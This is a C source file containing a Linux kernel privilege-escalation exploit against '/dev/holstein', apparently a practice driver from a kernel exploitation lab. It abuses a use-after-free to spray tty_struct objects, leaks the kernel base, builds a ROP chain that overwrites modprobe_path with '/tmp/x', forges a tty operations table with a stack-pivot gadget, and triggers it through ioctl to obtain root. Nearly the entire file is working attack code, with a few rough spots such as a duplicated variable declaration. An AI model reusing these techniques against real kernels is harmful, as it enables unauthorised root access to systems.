#include "kpwn.h"

int global_fd;
char *VULN_DRV = "/dev/holstein";

uint64_t user_cs, user_ss, user_rflags, user_sp;
uint64_t user_rip = (uint64_t) spawn_shell;
unsigned long cookie;
uint64_t cookie;
uint64_t kgaslr_leak;
uint64_t kbase;
uint8_t cookie_off;

void open_dev() {
    global_fd = open(VULN_DRV, O_RDWR);
    if (global_fd < 0) {
        printf("[!] Failed to open %s\n", VULN_DRV);
        exit(-1);
    } else {
        printf("[+] Successfully opened %s\n", VULN_DRV);
    }
}

/*
0xffffffff816421f6: mov [rdi+0x18], rsi; ret;
0xffffffff812f50b4: pop rsi; ret;
0xffffffff81455b1d: pop rdi; ret;
ffffffff81800e10 T swapgs_restore_regs_and_return_to_usermode
0xffffffff8114fbea: push rdx; xor eax, 0x415b004f; pop rsp; pop rbp; ret;
*/
int main() {
    save_state();
    int fd1 = open("/dev/holstein", O_RDWR);
    int fd2 = open("/dev/holstein", O_RDWR);
    close(fd1);

    int ptmx1 = open("/dev/ptmx", O_RDWR | O_NOCTTY);
    
    char buf[0x400];
    read(fd2, buf, 0x400);
    dump(buf, 0x400);

    uint64_t base_buf = *(uint64_t *)&buf[0x38] - 0x38;
    uint64_t kern = *(uint64_t *)&buf[0x18] - 0xc39c60;
    
    printf("kernel base: 0x%lx\n", kern);

    uint64_t modprobe = kern + 0xe38480;
    uint64_t mov_rdi_rsi = kern + 0x6421f6;
    uint64_t pop_rsi = kern + 0x2f50b4;
    uint64_t pop_rdi = kern + 0x455b1d;
    uint64_t trampoline = kern + 0x800e10;
    uint64_t pivot = kern + 0x14fbea;

    uint64_t *chain = (uint64_t *)&buf;
    #define ch *chain++
    ch = pop_rdi;
    ch = modprobe - 0x18;
    ch = pop_rsi;
    ch = *(uint64_t*)"/tmp/x\x00";
    ch = mov_rdi_rsi;
    ch = trampoline + 22;
    ch = 0;
    ch = 0;
    ch = (uint64_t) set_root_probe;
    RESTORE

    write(fd2, buf, 0x400);

    int fd3 = open("/dev/holstein", O_RDWR);
    int fd4 = open("/dev/holstein", O_RDWR);
    close(fd3);

    int ptmx2 = open("/dev/ptmx", O_RDWR | O_NOCTTY );

    char buf2[0x400];
    read(fd4, buf2, 0x400);

    uint64_t base_buf2 = *(uint64_t *)&buf2[0x38] - 0x38;
    uint64_t driver = *(uint64_t *)&buf2[0x38];
    
    struct tty_struct *tty = (uint64_t *)&buf2; 
    struct fake_operations_table *vtable = (uint64_t *)&buf2[0x300];
    memcpy(buf2, &fake_tty, sizeof(fake_tty));

    tty->driver = driver;
    tty->ops = base_buf2 + 0x300;
    vtable->ioctl = pivot;
    
    write(fd4, buf2, 0x400);

    ioctl(ptmx2, 0xdeadbeef, base_buf - 0x8);
    get_root_probe();

    return 0;
}
